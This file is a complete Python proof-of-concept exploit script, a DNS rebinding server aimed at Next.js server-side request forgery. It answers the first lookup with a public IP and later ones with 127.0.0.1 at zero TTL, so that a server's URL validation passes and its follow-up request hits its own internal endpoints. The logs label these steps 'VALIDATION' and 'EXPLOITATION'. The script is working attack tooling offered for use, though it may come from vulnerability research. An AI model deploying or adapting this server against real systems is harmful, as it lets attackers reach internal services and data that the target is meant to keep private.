#!/usr/bin/env python3
"""
DNS Rebinding Server for Next.js SSRF POC
Responds with public IP first, then switches to private IP
"""

import socket
import struct
import time
from datetime import datetime

class SimpleDNSServer:
    def __init__(self, public_ip='1.2.3.4', private_ip='127.0.0.1', domain='ssrf.test'):
        self.public_ip = public_ip
        self.private_ip = private_ip
        self.domain = domain
        self.request_count = 0
        self.switch_after = 1  # Switch to private IP after N requests

    def log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        print(f"[{timestamp}] {message}")

    def build_dns_response(self, query_data, ip_address):
        """Build a DNS response packet"""
        # Parse query ID (first 2 bytes)
        query_id = query_data[:2]

        # DNS Header (12 bytes)
        # Query ID (2 bytes) + Flags (2 bytes) + Questions (2) + Answers (2) + Authority (2) + Additional (2)
        flags = b'\x81\x80'  # Standard query response, no error
        questions = b'\x00\x01'  # 1 question
        answers = b'\x00\x01'  # 1 answer
        authority = b'\x00\x00'  # 0 authority records
        additional = b'\x00\x00'  # 0 additional records

        header = query_id + flags + questions + answers + authority + additional

        # Question section (copy from query, starts at byte 12)
        question = query_data[12:]

        # Find the end of the question (two null bytes in a row or 0x00 + type + class)
        q_end = question.find(b'\x00')
        if q_end != -1:
            question = question[:q_end + 5]  # Include null byte + type (2) + class (2)

        # Answer section
        # Name pointer (2 bytes) - points back to question
        answer_name = b'\xc0\x0c'  # Pointer to offset 12 (question)

        # Type A (2 bytes)
        answer_type = b'\x00\x01'

        # Class IN (2 bytes)
        answer_class = b'\x00\x01'

        # TTL (4 bytes) - 0 seconds for immediate rebinding
        answer_ttl = b'\x00\x00\x00\x00'

        # Data length (2 bytes) - 4 bytes for IPv4
        answer_data_len = b'\x00\x04'

        # IP address (4 bytes)
        ip_parts = ip_address.split('.')
        answer_ip = bytes([int(p) for p in ip_parts])

        answer = answer_name + answer_type + answer_class + answer_ttl + answer_data_len + answer_ip

        return header + question + answer

    def handle_query(self, data, addr):
        """Handle incoming DNS query"""
        try:
            # Extract domain from query (simplified parsing)
            query_str = data.hex()

            # Determine which IP to return
            self.request_count += 1

            if self.request_count <= self.switch_after:
                ip = self.public_ip
                stage = "VALIDATION"
                self.log(f"[{stage}] Request #{self.request_count} from {addr[0]} → Returning PUBLIC IP: {ip}")
            else:
                ip = self.private_ip
                stage = "EXPLOITATION"
                self.log(f"[{stage}] Request #{self.request_count} from {addr[0]} → Returning PRIVATE IP: {ip} ⚠️")

            # Build and return response
            response = self.build_dns_response(data, ip)
            return response

        except Exception as e:
            self.log(f"Error handling query: {e}")
            return None

    def run(self, port=53):
        """Run the DNS server"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            sock.bind(('0.0.0.0', port))
            self.log(f"DNS Server started on 0.0.0.0:{port}")
            self.log(f"Domain: {self.domain}")
            self.log(f"Stage 1 (validation): {self.public_ip}")
            self.log(f"Stage 2 (exploitation): {self.private_ip}")
            self.log(f"Switching after {self.switch_after} request(s)")
            self.log("-" * 60)

            while True:
                data, addr = sock.recvfrom(512)
                response = self.handle_query(data, addr)
                if response:
                    sock.sendto(response, addr)

        except PermissionError:
            self.log("ERROR: Permission denied. Run with sudo:")
            self.log("  sudo python3 dns-rebinding-server.py")
        except KeyboardInterrupt:
            self.log("\nServer stopped")
        finally:
            sock.close()

if __name__ == '__main__':
    import sys

    # Configuration
    public_ip = '1.2.3.4'  # Safe public IP (doesn't exist, will cause connection refused)
    private_ip = '127.0.0.1'  # Localhost - will access Next.js server itself
    domain = 'ssrf.test'

    # Parse command line arguments
    if len(sys.argv) > 1:
        public_ip = sys.argv[1]
    if len(sys.argv) > 2:
        private_ip = sys.argv[2]

    print("="*60)
    print("DNS Rebinding Server - Next.js SSRF POC")
    print("="*60)
    print(f"\nConfiguration:")
    print(f"  Public IP (stage 1):  {public_ip}")
    print(f"  Private IP (stage 2): {private_ip}")
    print(f"  Domain: {domain}")
    print(f"\nUsage: sudo python3 {sys.argv[0]} [public_ip] [private_ip]")
    print("Example: sudo python3 dns-rebinding-server.py 8.8.8.8 127.0.0.1")
    print("\n")

    server = SimpleDNSServer(public_ip, private_ip, domain)
    server.run()
